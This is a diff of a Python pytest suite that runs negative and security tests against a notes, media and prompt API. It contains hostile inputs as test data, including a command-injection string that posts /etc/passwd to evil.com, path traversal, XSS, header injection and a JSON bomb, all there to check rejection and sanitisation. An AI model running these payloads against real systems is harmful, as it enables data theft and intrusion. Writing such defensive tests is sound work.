@@ -33,24 +33,24 @@ from test_data import TestDataGenerator
 
 class TestAuthenticationNegative:
     """Test authentication and authorization negative scenarios."""
-    
+
     def test_missing_api_key(self, api_client):
         """Test requests without authentication headers."""
         # Remove all auth headers
         original_headers = api_client.client.headers.copy()
         api_client.client.headers.clear()
-        
+
         try:
             # Attempt to access protected endpoint
             with pytest.raises(httpx.HTTPStatusError) as exc_info:
                 api_client.get_media_list()
-            
+
             assert exc_info.value.response.status_code in [401, 403], \
                 f"Expected 401/403, got {exc_info.value.response.status_code}"
         finally:
             # Restore headers
             api_client.client.headers = original_headers
-    
+
     def test_invalid_api_key_format(self, api_client):
         """Test various invalid API key formats."""
         invalid_keys = [
@@ -64,13 +64,13 @@ class TestAuthenticationNegative:
             "../../../etc/passwd",  # Path traversal
             "<script>alert('xss')</script>",  # XSS attempt
         ]
-        
+
         original_headers = api_client.client.headers.copy()
-        
+
         for invalid_key in invalid_keys:
             api_client.client.headers["X-API-KEY"] = invalid_key
             api_client.client.headers["Token"] = invalid_key
-            
+
             try:
                 # Use a protected endpoint instead of health check
                 api_client.get_media_list()
@@ -82,23 +82,23 @@ class TestAuthenticationNegative:
                     assert exc_info.response.status_code in [400, 401, 403], \
                         f"Invalid key '{invalid_key[:20]}...' should be rejected with 401/403, got {exc_info.response.status_code}"
                 # httpx.LocalProtocolError is also acceptable for malformed headers
-        
+
         # Restore headers
         api_client.client.headers = original_headers
-    
+
     def test_expired_token_handling(self, api_client):
         """Test handling of expired JWT tokens (multi-user mode)."""
         # Check if we're in single-user mode (API key auth)
         if "X-API-KEY" in api_client.client.headers:
             pytest.skip("JWT tests not applicable in single-user mode")
-        
+
         # This would need a way to generate an expired token
         # For now, test with malformed JWT
         malformed_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.corrupted.signature"
-        
+
         original_headers = api_client.client.headers.copy()
         api_client.client.headers["Authorization"] = f"Bearer {malformed_jwt}"
-        
+
         try:
             # Try to access protected endpoint with malformed JWT
             api_client.get_media_list()
@@ -107,23 +107,23 @@ class TestAuthenticationNegative:
             assert exc_info.response.status_code in [401, 403]
         finally:
             api_client.client.headers = original_headers
-    
+
     def test_concurrent_login_attempts(self, api_client):
         """Test multiple simultaneous login attempts with same credentials."""
         # Skip in single-user mode as there's no login endpoint
         if "X-API-KEY" in api_client.client.headers:
             pytest.skip("Login tests not applicable in single-user mode")
-            
+
         # Generate test credentials
         user_data = TestDataGenerator.generate_test_user()
-        
+
         import concurrent.futures
         import threading
-        
+
         results = []
         errors = []
         lock = threading.Lock()
-        
+
         def attempt_login():
             try:
                 response = api_client.login(
@@ -135,22 +135,22 @@ class TestAuthenticationNegative:
             except Exception as e:
                 with lock:
                     errors.append(str(e))
-        
+
         # Attempt 10 concurrent logins
         with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
             futures = [executor.submit(attempt_login) for _ in range(10)]
             concurrent.futures.wait(futures)
-        
+
         # At least some should fail or be rate limited
         assert len(errors) > 0 or len(set(r.get("token") for r in results)) > 1, \
             "Concurrent logins should be handled properly"
-    
+
     def test_authorization_header_injection(self, api_client):
         """Test authorization header injection attempts."""
         # Skip in single-user mode as it uses API keys
         if "X-API-KEY" in api_client.client.headers:
             pytest.skip("Authorization header tests not applicable in single-user mode")
-            
+
         injection_attempts = [
             "Bearer token1 Bearer token2",  # Double bearer
             "Basic YWRtaW46YWRtaW4=",  # Basic auth attempt
@@ -158,37 +158,37 @@ class TestAuthenticationNegative:
             "Bearer token; admin=true",  # Parameter injection
             "Bearer token\r\nX-Admin: true",  # Header injection
         ]
-        
+
         original_headers = api_client.client.headers.copy()
-        
+
         for injection in injection_attempts:
             api_client.client.headers["Authorization"] = injection
-            
+
             try:
                 api_client.get_media_list()
                 pytest.fail(f"Header injection '{injection[:30]}...' should be rejected")
             except httpx.HTTPStatusError as exc_info:
                 assert exc_info.response.status_code in [400, 401, 403]
-        
+
         api_client.client.headers = original_headers
 
 
 class TestMediaUploadNegative:
     """Test media upload negative scenarios."""
-    
+
     def test_upload_oversized_file(self, authenticated_client, data_tracker):
         """Test uploading file exceeding size limits."""
         # Create a large file (simulate 1GB)
         large_file = tempfile.NamedTemporaryFile(suffix=".txt", delete=False)
         data_tracker.add_file(large_file.name)
-        
+
         try:
             # Write 101MB of data (exceeds 100MB limit)
             chunk = b"x" * (1024 * 1024)  # 1MB chunk
             for _ in range(101):
                 large_file.write(chunk)
             large_file.close()
-            
+
             # Attempt upload
             try:
                 result = authenticated_client.upload_media(
@@ -202,10 +202,10 @@ class TestMediaUploadNegative:
                 # Should reject with 413 or 400
                 assert exc_info.response.status_code in [400, 413], \
                     f"Oversized file should be rejected with 413/400, got {exc_info.response.status_code}"
-                
+
         finally:
             cleanup_test_file(large_file.name)
-    
+
     def test_upload_invalid_file_types(self, authenticated_client):
         """Test uploading potentially dangerous file types."""
         dangerous_extensions = [
@@ -216,12 +216,12 @@ class TestMediaUploadNegative:
             (".app", b"malicious"),  # Application
             (".scr", b"screensaver"),  # Screensaver (executable)
         ]
-        
+
         for ext, content in dangerous_extensions:
             with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as f:
                 f.write(content)
                 temp_file = f.name
-            
+
             try:
                 with pytest.raises(httpx.HTTPStatusError) as exc_info:
                     authenticated_client.upload_media(
@@ -229,13 +229,13 @@ class TestMediaUploadNegative:
                         title=f"Dangerous file {ext}",
                         media_type="document"
                     )
-                
+
                 # Should reject with 400 or 415
                 assert exc_info.value.response.status_code in [400, 415], \
                     f"File type {ext} should be rejected"
             finally:
                 cleanup_test_file(temp_file)
-    
+
     def test_upload_corrupted_files(self, authenticated_client):
         """Test uploading corrupted files of various types."""
         corrupted_files = [
@@ -248,12 +248,12 @@ class TestMediaUploadNegative:
             # Truncated video file
             (".mp4", b"ftypmp4truncated"),
         ]
-        
+
         for ext, content in corrupted_files:
             with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as f:
                 f.write(content)
                 temp_file = f.name
-            
+
             try:
                 # Upload might succeed but processing should fail
                 response = authenticated_client.upload_media(
@@ -261,19 +261,19 @@ class TestMediaUploadNegative:
                     title=f"Corrupted {ext}",
                     media_type="document"
                 )
-                
+
                 # Check if error is reported in response
                 if "results" in response:
                     result = response["results"][0]
                     assert result.get("status") == "Error" or result.get("error"), \
                         f"Corrupted {ext} should report error"
-                        
+
             except httpx.HTTPStatusError:
                 # Also acceptable to reject at upload
                 pass
             finally:
                 cleanup_test_file(temp_file)
-    
+
     def test_upload_malicious_filenames(self, authenticated_client):
         """Test uploading files with malicious filenames."""
         malicious_names = [
@@ -290,15 +290,15 @@ class TestMediaUploadNegative:
             "." * 300 + ".txt",  # Extremely long extension
             "\x00\x01\x02.txt",  # Binary in filename
         ]
-        
+
         content = b"Test content"
-        
+
         for malicious_name in malicious_names:
             # Create file with normal name, but send with malicious name
             with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as f:
                 f.write(content)
                 temp_file = f.name
-            
+
             try:
                 # Override the filename in the request
                 with open(temp_file, "rb") as f:
@@ -308,13 +308,13 @@ class TestMediaUploadNegative:
                         "media_type": "document",
                         "overwrite_existing": "true"
                     }
-                    
+
                     response = authenticated_client.client.post(
                         f"{API_PREFIX}/media/add",
                         files=files,
                         data=data
                     )
-                    
+
                     # Should sanitize the filename or reject
                     if response.status_code == 200:
                         result = response.json()
@@ -323,19 +323,19 @@ class TestMediaUploadNegative:
                             stored_name = result["results"][0].get("filename", "")
                             assert malicious_name not in stored_name, \
                                 f"Malicious filename should be sanitized"
-                                
+
             except httpx.HTTPStatusError as e:
                 # Rejection is also acceptable
                 assert e.response.status_code in [400, 422]
             finally:
                 cleanup_test_file(temp_file)
-    
+
     def test_upload_empty_file(self, authenticated_client):
         """Test uploading empty files."""
         with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as f:
             # Don't write anything - empty file
             temp_file = f.name
-        
+
         try:
             with pytest.raises(httpx.HTTPStatusError) as exc_info:
                 authenticated_client.upload_media(
@@ -343,75 +343,75 @@ class TestMediaUploadNegative:
                     title="Empty File",
                     media_type="document"
                 )
-            
+
             # Should reject empty files
             assert exc_info.value.response.status_code in [400, 422]
         finally:
             cleanup_test_file(temp_file)
-    
+
     def test_upload_without_required_fields(self, authenticated_client):
         """Test uploading without required fields."""
         with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as f:
             f.write(b"Test content")
             temp_file = f.name
-        
+
         try:
             # Missing title
             with open(temp_file, "rb") as f:
                 files = {"files": ("test.txt", f, "text/plain")}
                 data = {"media_type": "document"}  # No title
-                
+
                 response = authenticated_client.client.post(
                     f"{API_PREFIX}/media/add",
                     files=files,
                     data=data
                 )
-                
+
                 # Might auto-generate title or reject
                 if response.status_code != 200:
                     assert response.status_code in [400, 422]
-                    
+
         finally:
             cleanup_test_file(temp_file)
 
 
 class TestDataValidationNegative:
     """Test data validation and injection prevention."""
-    
+
     def test_sql_injection_in_search(self, authenticated_client):
         """Test SQL injection attempts in search queries - verify proper sanitization."""
         sql_injections = TestDataGenerator.malicious_payloads()['sql_injection']
-        
+
         print("\n=== SQL Injection Prevention Test ===")
         blocked_count = 0
         sanitized_count = 0
-        
+
         for injection in sql_injections[:5]:  # Test subset to avoid rate limiting
             print(f"  Testing: '{injection[:30]}...'")
-            
+
             try:
                 response = authenticated_client.search_media(injection)
-                
+
                 # Request succeeded - verify injection was sanitized
                 if "results" in response or "items" in response:
                     results = response.get("results") or response.get("items", [])
                     assert isinstance(results, list), "Search should return list"
-                    
+
                     # Verify no SQL keywords in results (shouldn't execute)
                     result_str = str(results).lower()
                     dangerous_indicators = ['drop', 'delete', 'union', 'sleep', 'exec']
-                    
+
                     for indicator in dangerous_indicators:
                         if indicator in injection.lower() and indicator in result_str:
                             pytest.fail(f"SQL keyword '{indicator}' found in results - possible injection!")
-                    
+
                     sanitized_count += 1
                     print(f"    ✓ Sanitized - returned {len(results)} results")
-                    
+
                 # Verify system still healthy
                 health = authenticated_client.health_check()
                 assert health["status"] == "healthy", "System unhealthy after injection"
-                
+
             except httpx.HTTPStatusError as e:
                 if e.response.status_code in [400, 422]:
                     blocked_count += 1
@@ -420,48 +420,48 @@ class TestDataValidationNegative:
                     pytest.fail(f"Server error on injection '{injection[:30]}' - possible vulnerability!")
                 else:
                     print(f"    ? Unexpected status {e.response.status_code}")
-        
+
         print(f"\nResults: {blocked_count} blocked, {sanitized_count} sanitized")
         print("=== SQL Injection Test Complete ===")
-        
+
         # At least one method of protection should be active
         assert blocked_count > 0 or sanitized_count > 0, "No SQL injection protection detected!"
-    
+
     @pytest.mark.skip(reason="XSS sanitization not implemented - not a requirement")
     def test_xss_in_note_content(self, authenticated_client, data_tracker):
         """Test XSS attempts in note content - verify proper sanitization."""
         xss_payloads = TestDataGenerator.malicious_payloads()['xss']
-        
+
         print("\n=== XSS Prevention Test ===")
         blocked_count = 0
         sanitized_count = 0
         created_notes = []
-        
+
         for payload in xss_payloads[:5]:  # Test subset
             print(f"  Testing XSS: '{payload[:30]}...'")
-            
+
             try:
                 response = authenticated_client.create_note(
                     title=f"XSS Test",
                     content=payload,
                     keywords=["test", "xss"]
                 )
-                
+
                 # Note created - verify content is sanitized
                 if "id" in response or "note_id" in response:
                     note_id = response.get("id") or response.get("note_id")
                     data_tracker.add_note(note_id)
                     created_notes.append(note_id)
-                    
+
                     # Retrieve note to check sanitization
                     try:
                         note_detail = authenticated_client.client.get(f"/api/v1/notes/{note_id}").json()
                         stored_content = note_detail.get("content", "")
-                        
+
                         # Check if dangerous tags are escaped/removed
                         dangerous_patterns = ['<script', 'onerror', 'javascript:', 'onclick', '<iframe']
                         found_dangerous = False
-                        
+
                         for pattern in dangerous_patterns:
                             if pattern.lower() in stored_content.lower():
                                 # Check if it's escaped (e.g., &lt;script&gt;)
@@ -473,34 +473,34 @@ class TestDataValidationNegative:
                                     pytest.fail(f"XSS not sanitized: {pattern} found in content")
                                 found_dangerous = True
                                 break
-                        
+
                         if not found_dangerous:
                             print(f"    ✓ Sanitized - dangerous content removed")
                             sanitized_count += 1
-                            
+
                     except Exception as e:
                         print(f"    ? Could not verify: {e}")
-                    
+
             except httpx.HTTPStatusError as e:
                 if e.response.status_code in [400, 422]:
                     blocked_count += 1
                     print(f"    ✓ Blocked with {e.response.status_code}")
                 else:
                     print(f"    ? Unexpected status {e.response.status_code}")
-        
+
         print(f"\nResults: {blocked_count} blocked, {sanitized_count} sanitized")
         print("=== XSS Test Complete ===")
-        
+
         # Cleanup created notes
         for note_id in created_notes:
             try:
                 authenticated_client.delete_note(note_id)
             except:
                 pass
-        
+
         # At least one protection method should be active
         assert blocked_count > 0 or sanitized_count > 0, "No XSS protection detected!"
-    
+
     def test_command_injection_in_prompts(self, authenticated_client, data_tracker):
         """Test command injection in prompt content."""
         command_injections = [
@@ -513,30 +513,30 @@ class TestDataValidationNegative:
             "$(curl -X POST evil.com -d @/etc/passwd)",
             "`python -c 'import os; os.system(\"ls\")'`",
         ]
-        
+
         for injection in command_injections:
             prompt_content = f"Summarize this: {injection}"
-            
+
             try:
                 response = authenticated_client.create_prompt(
                     name=f"Injection Test {injection[:10]}",
                     content=prompt_content,
                     description="Test prompt"
                 )
-                
+
                 if "id" in response or "prompt_id" in response:
                     prompt_id = response.get("id") or response.get("prompt_id")
                     data_tracker.add_prompt(prompt_id)
-                    
+
                     # Commands should not be executed
                     # System should remain stable
                     health = authenticated_client.health_check()
                     assert health["status"] == "healthy"
-                    
+
             except httpx.HTTPStatusError as e:
                 # Rejection is acceptable
                 pass
-    
+
     def test_unicode_edge_cases(self, authenticated_client):
         """Test Unicode edge cases and encoding issues."""
         unicode_tests = [
@@ -551,7 +551,7 @@ class TestDataValidationNegative:
             "𠜎𠜱𡿺𢌱𥄫𦉘𦟌𦧲",  # Complex CJK
             "\u202e\u202d",  # Right-to-left override
         ]
-        
+
         for unicode_str in unicode_tests:
             try:
                 response = authenticated_client.create_note(
@@ -559,25 +559,25 @@ class TestDataValidationNegative:
                     content=f"Testing: {unicode_str}",
                     keywords=["unicode", "test"]
                 )
-                
+
                 # Should handle gracefully
                 if "id" in response or "note_id" in response:
                     note_id = response.get("id") or response.get("note_id")
-                    
+
                     # Verify retrieval works
                     notes = authenticated_client.get_notes()
-                    
+
             except httpx.HTTPStatusError as e:
                 # Some Unicode might be rejected
                 assert e.response.status_code in [400, 422]
-    
+
     def test_json_bomb(self, authenticated_client):
         """Test JSON bomb/billion laughs attack."""
         # Create deeply nested JSON
         json_bomb = {"a": ["b"]}
         for _ in range(100):
             json_bomb = {"a": [json_bomb]}
-        
+
         try:
             response = authenticated_client.client.post(
                 f"{API_PREFIX}/notes/",
@@ -587,7 +587,7 @@ class TestDataValidationNegative:
                     "keywords": ["test"]
                 }
             )
-            
+
             # Should reject deep nesting or accept gracefully
             if response.status_code in [200, 201]:
                 # Accepted - verify system still responsive
@@ -598,11 +598,11 @@ class TestDataValidationNegative:
             else:
                 # Rejection is good
                 assert response.status_code in [400, 413, 422]
-                
+
         except httpx.HTTPStatusError as e:
             # Expected to reject
             assert e.response.status_code in [400, 413, 422]
-    
+
     def test_header_injection(self, authenticated_client):
         """Test HTTP header injection attempts."""
         injection_headers = [
@@ -611,17 +611,17 @@ class TestDataValidationNegative:
             ("X-Inject\nContent-Length: 0", "value"),
             ("X-Test", "value\nSet-Cookie: admin=true"),
         ]
-        
+
         original_headers = authenticated_client.client.headers.copy()
-        
+
         for header_name, header_value in injection_headers:
             try:
                 authenticated_client.client.headers[header_name] = header_value
                 response = authenticated_client.health_check()
-                
+
                 # Should not process injected headers
                 # Verify no admin access granted
-                
+
             except (httpx.HTTPStatusError, httpx.InvalidURL, ValueError, httpx.LocalProtocolError):
                 # Rejection is expected - httpx validates headers
                 pass
@@ -631,11 +631,11 @@ class TestDataValidationNegative:
 
 class TestResourceLimitsNegative:
     """Test resource limits and boundary conditions."""
-    
+
     def test_exceed_rate_limits(self, authenticated_client):
         """Test exceeding API rate limits."""
         import time
-        
+
         # Make rapid requests
         errors_429 = 0
         for i in range(100):
@@ -648,17 +648,17 @@ class TestResourceLimitsNegative:
                     errors_429 += 1
                     # Rate limiting is working
                     break
-        
+
         # Should hit rate limit at some point (if implemented)
         # If not implemented, that's also worth noting
         if errors_429 == 0:
             print("Warning: No rate limiting detected after 100 rapid requests")
-    
+
     def test_maximum_field_lengths(self, authenticated_client):
         """Test maximum field length boundaries."""
         # Test various field length limits
         long_string = "x" * 100000  # 100K characters
-        
+
         test_cases = [
             # Note with extremely long title
             {
@@ -682,7 +682,7 @@ class TestResourceLimitsNegative:
                 "query": long_string
             }
         ]
-        
+
         for test in test_cases:
             if test.get("endpoint") == "search":
                 try:
@@ -709,13 +709,13 @@ class TestResourceLimitsNegative:
                         assert response.status_code in [400, 409, 413, 422]  # 409 for conflicts
                 except httpx.HTTPStatusError as e:
                     assert e.response.status_code in [400, 409, 413, 422]  # 409 for conflicts
-    
+
     def test_create_excessive_resources(self, authenticated_client, data_tracker):
         """Test creating excessive number of resources."""
         # Try to create many notes rapidly
         created_count = 0
         failed_count = 0
-        
+
         for i in range(1000):
             try:
                 response = authenticated_client.create_note(
@@ -723,35 +723,35 @@ class TestResourceLimitsNegative:
                     content=f"Content {i}",
                     keywords=[f"bulk{i}"]
                 )
-                
+
                 if "id" in response or "note_id" in response:
                     note_id = response.get("id") or response.get("note_id")
                     data_tracker.add_note(note_id)
                     created_count += 1
-                    
+
             except httpx.HTTPStatusError as e:
                 failed_count += 1
                 if e.response.status_code in [429, 507]:  # Rate limit or storage full
                     break
-                    
+
             # Stop if we start hitting limits
             if failed_count > 10:
                 break
-        
+
         # Should have some limit on resource creation
         if created_count >= 1000:
             print(f"⚠ API allowed creation of {created_count} resources without limits - potential DoS vulnerability")
             # This is a security finding but we'll log it rather than fail the test
         else:
             print(f"✓ Resource creation limited at {created_count} notes")
-        
+
         # If we created a lot of resources, it's still a valid finding
         if created_count >= 100:
             print("⚠ Consider implementing stricter rate limits for bulk operations")
-        
+
         # Clean up
         print(f"Created {created_count} notes, {failed_count} failed")
-    
+
     def test_integer_overflow(self, authenticated_client):
         """Test integer overflow conditions."""
         overflow_values = [
@@ -765,7 +765,7 @@ class TestResourceLimitsNegative:
             float('-inf'),  # Negative infinity
             float('nan'),  # Not a number
         ]
-        
+
         for value in overflow_values:
             try:
                 # Try with limit parameter
@@ -773,7 +773,7 @@ class TestResourceLimitsNegative:
                     f"{API_PREFIX}/media/",
                     params={"limit": value, "offset": 0}
                 )
-                
+
                 # Should handle gracefully
                 if response.status_code == 200:
                     result = response.json()
@@ -783,11 +783,11 @@ class TestResourceLimitsNegative:
                             "Should apply reasonable limit"
                 else:
                     assert response.status_code in [400, 422]
-                    
+
             except (httpx.HTTPStatusError, ValueError, TypeError):
                 # Expected to reject invalid values
                 pass
-    
+
     def test_negative_values(self, authenticated_client):
         """Test negative values where not expected."""
         test_cases = [
@@ -795,7 +795,7 @@ class TestResourceLimitsNegative:
             ("offset", -100),
             ("temperature", -1.0),
         ]
-        
+
         for param, value in test_cases:
             try:
                 if param in ["limit", "offset"]:
@@ -813,7 +813,7 @@ class TestResourceLimitsNegative:
                             "temperature": value
                         }
                     )
-                
+
                 # Should reject negative values or use defaults
                 if hasattr(response, 'status_code'):
                     if response.status_code == 200:
@@ -821,7 +821,7 @@ class TestResourceLimitsNegative:
                         pass
                     else:
                         assert response.status_code in [400, 422]
-                    
+
             except httpx.HTTPStatusError as e:
                 assert e.response.status_code in [400, 422]
 
